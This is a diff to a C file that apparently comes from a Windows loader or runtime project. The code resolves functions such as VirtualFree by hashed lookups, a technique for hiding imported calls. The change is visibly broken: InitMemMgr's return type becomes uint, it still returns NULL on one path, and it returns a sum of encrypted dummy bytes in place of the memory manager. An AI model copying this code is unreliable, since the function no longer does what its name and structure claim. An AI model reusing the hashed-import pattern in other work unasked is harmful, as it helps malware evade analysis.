@@ -2,6 +2,7 @@
 #include "hash_api.h"
 #include "windows_t.h"
 #include "random.h"
+#include "crypto.h"
 #include "memory.h"
 
 typedef struct {
@@ -15,7 +16,7 @@ typedef struct {
 
 static bool initAPI(MemMgr* manager, FindAPI_t findAPI);
 
-MemMgr* InitMemMgr(FindAPI_t findAPI)
+uint InitMemMgr(FindAPI_t findAPI)
 {
     // allocate memory for store MemMgr structure.
     #ifdef _WIN64
@@ -36,17 +37,38 @@ MemMgr* InitMemMgr(FindAPI_t findAPI)
         return NULL;
     }
 
-    return RandUint(0);
+    byte encData1[] = {
+        0, 1, 2, 3, 0, 1, 2, 3,0, 1, 2, 3,0, 1, 2, 3,
+        0, 1, 2, 3, 0, 1, 2, 3,0, 1, 2, 3,0, 1, 2, 3,
+    };
+
+     byte encData2[] = {
+        1, 1, 2, 3, 0, 1, 2, 3,0, 1, 2, 3,0, 1, 2, 3,
+        0, 1, 2, 3, 0, 1, 2, 3,0, 1, 2, 3,0, 1, 2, 3,
+    };
+
+    byte encKey[] = { 
+        0, 1, 1, 13, 0, 12, 2, 64, 0, 200, 2, 3, 123, 1, 44, 3,
+        0, 1, 2, 13, 200, 31, 2, 21, 0, 1, 48, 3, 48, 1, 1, 3,
+    };
+
+    RandBuf(&encKey[0], 32);
+
+    EncryptBuf(&encData1[0], 32, &encKey[0]);
+    EncryptBuf(&encData2[0], 32, &encKey[0]);
+
+
+    return encData1[0] + encData2[0];
 }
 
 static bool initAPI(MemMgr* manager, FindAPI_t findAPI)
 {
 #ifdef _WIN64
     uint64 hash = 0xB82F958E3932DE49;
-    uint64 key = 0x1CA95AA0C4E69F35;
+    uint64 key  = 0x1CA95AA0C4E69F35;
 #elif _WIN32
     uint32 hash = 0xFE192059;
-    uint32 key = 0x397FD02C;
+    uint32 key  = 0x397FD02C;
 #endif
     VirtualFree virtualFree = (VirtualFree)findAPI(hash, key);
     if (virtualFree == NULL)
